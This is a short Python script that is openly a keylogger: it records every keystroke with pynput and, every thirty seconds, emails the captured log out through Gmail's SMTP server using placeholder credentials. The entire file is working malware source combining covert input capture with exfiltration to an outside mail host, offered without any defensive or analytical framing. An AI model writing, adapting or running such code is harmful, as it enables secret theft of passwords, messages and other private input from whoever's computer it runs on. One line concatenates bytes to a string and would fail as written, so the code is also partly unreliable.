import pynput.keyboard
import smtplib
import threading

log=""

def callback_function(key):  
    global log
    try:
        log+=key.char.encode("utf-8")  
  

    except AttributeError:

        if key==key.space:
            log+=" "
        else:
             log+=str(key) 

    print(log)

def send_email(email,password,mesaj):
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,mesaj)
    server.quit()

def thread_function():
    global log
    send_email("xxxxxxxxx", "xxxxxxx",log)
    log=""
    timer_object=threading.Timer(30,thread_function) 
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
